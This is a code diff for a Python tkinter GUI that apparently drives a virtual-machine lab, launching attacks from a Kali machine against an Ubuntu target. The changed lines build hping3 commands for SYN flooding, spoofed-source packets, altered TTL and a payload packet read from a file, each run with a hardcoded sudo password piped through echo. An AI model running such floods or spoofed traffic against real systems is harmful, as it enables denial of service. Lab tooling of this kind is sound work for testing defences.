@@ -6,7 +6,7 @@ import tkinter as tk
 import subprocess
 from tkinter import messagebox
 from tkinter import ttk
-from test import VMManager  # Replace with the actual VMManager import
+from Manager import VMManager  # Replace with the actual VMManager import
 
 """
 Right now this is the main entry point for the application.
@@ -143,13 +143,15 @@ class VMGUI:
         threading.Thread(target=self._monitor_attack, args=(), daemon=True).start()
         port = 80
         packet_count = 1000
+        payload_size = 1024*4
         fake_ip = "10.10.10.4"
-        fake_ip2 = "10.11.12.2"
-        if atk == "SYN Flood":
-            cmd = f"echo kali | sudo -S hping3 -S -c {packet_count} -p {port} {ubuntu_ip}"
+        fake_ip2 = "10.11.12.4"
+        fake_ip3 = "11.12.13.4"
+        if atk == "payload":
+            cmd = f"echo kali | sudo -S hping3 -S -p {port} -a {fake_ip3}  -d {payload_size} -E payload.txt {ubuntu_ip} -c 3"
         elif atk == "Dos":
-            cmd = f"echo kali | sudo -S hping3 -S -p {port} -a {fake_ip} -i u{packet_count} {ubuntu_ip}"
-        elif atk == "ttl":
+            cmd = f"echo kali | sudo -S hping3 -S -p {port} -a {fake_ip} -i {packet_count} {ubuntu_ip}"
+        elif atk == "spoof packet":
             cmd = f"echo kali | sudo -S hping3 -S -p {port} -a {fake_ip2} {ubuntu_ip} --ttl 200 -c 10"
         else:
             messagebox.showerror("Unknown Attack", "Invalid attack selected.")
